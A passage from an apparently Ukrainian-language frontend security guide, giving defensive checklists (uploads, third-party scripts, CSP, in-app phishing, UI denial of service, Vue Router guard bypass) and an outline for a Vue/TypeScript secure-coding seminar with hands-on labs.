- Завантаження валідуються за MIME та magic bytes.
- User-upload не виконується як активний контент у тому ж origin.
- Файловий хостинг ізольовано від сесійного домену.

### Сторонні скрипти/віджети

- Кількість third-party скриптів мінімізована.
- Є інвентар і власник для кожної інтеграції.
- CSP `script-src` не містить зайвих wildcard.
- Для статичних CDN-скриптів застосовується SRI (де можливо).
- Доступ до Tag Manager захищено 2FA та аудитом змін.

### Phishing-in-the-app

- Форми re-login/MFA рендеряться лише перевіреним компонентом.
- Немає довільних модалок, що запитують пароль/OTP.
- Критичні підтвердження виконуються через trusted канал.
- UX-маркери автентичності сталі і перевірені.
- Проведено тестування сценаріїв social engineering у продукті.

### Denial of UI Service (DoUS)

- Для великих списків використовується віртуалізація.
- Payload-ліміти визначені на API і клієнті.
- Компоненти не мають витоків пам’яті при unmount.
- Рендер і обробники подій профільовані на продуктивність.
- Налаштовано моніторинг long tasks і memory growth.

### Vue Router guard bypass

- Guard-и не вважаються security boundary.
- Кожен чутливий API endpoint перевіряє авторизацію на сервері.
- Клієнтські ролі/флаги не є єдиним джерелом істини.
- Доступ до адмін-даних неможливий без серверного дозволу.
- Є інтеграційні тести на ручний обхід guard-ів.

### Слабка/відсутня CSP

- CSP політика визначена та версіонується разом із кодом.
- Inline scripts/style дозволені лише за суворої потреби (nonce/hash).
- `Report-Only` звіти регулярно переглядаються.
- Політика узгоджена з набором довірених доменів.
- Зміни CSP проходять окремий security review.

## Семінар

План проведення семінару «Фронтенд-безпека для JS/TS + Vue»:

1. Вступ (15 хв)
   - Модель загроз для фронтенда: що реально може атакувати користувач браузера.
   - Різниця між «валідація для UX» та «валідація для безпеки».

2. Блок 1: XSS і суміжні ризики (45 хв)
   - Stored/Reflected/DOM/mXSS.
   - Небезпечні API: `innerHTML`, `eval`, `v-html`, динамічні шаблони.
   - Практика: знайти XSS у демо-компоненті Vue і виправити.

3. Блок 2: CSRF, CORS, OAuth у SPA (45 хв)
   - Cookie-based auth та `SameSite`.
   - CSRF токени, origin checks, CORS allowlist.
   - Практика: моделювання CSRF-атаки на тестовий endpoint.

4. Блок 3: Залежності й supply chain (30 хв)
   - Typosquatting, dependency confusion, шкідливі postinstall.
   - Політика оновлень і аудитів (`npm audit`, lockfile discipline).
   - Практика: аналіз підозрілої залежності за чеклістом.

5. Блок 4: UI/UX-атаки (30 хв)
   - Clickjacking, tabnabbing, in-app phishing, CSS overlay.
   - Практика: побудова фальшивого сценарію та його нейтралізація.

6. Блок 5: Vue/Tailwind secure coding patterns (30 хв)
   - Безпечний рендеринг даних у Vue.
   - Обмеження динамічних класів/стилів у Tailwind/SCSS.
   - Практика: рефакторинг небезпечного компонента.

7. Hands-on лабораторія (60 хв)
   - Учасники отримують уразливий мініпроєкт.
   - Завдання: знайти 8–12 вразливостей і запропонувати виправлення.
   - Розбір із пріоритизацією за ризиком (Critical/High/Medium/Low).

8. Фінальний контроль (15 хв)
   - Короткий тест + розбір типових помилок.
   - Домашній чекліст безпеки для щоденного code review.

9. Артефакти після семінару
   - Шаблон threat model для фронтенд-фіч.
   - Secure coding checklist для Vue/TypeScript.
   - Базовий incident playbook: що робити при підозрі на XSS/витік токена.
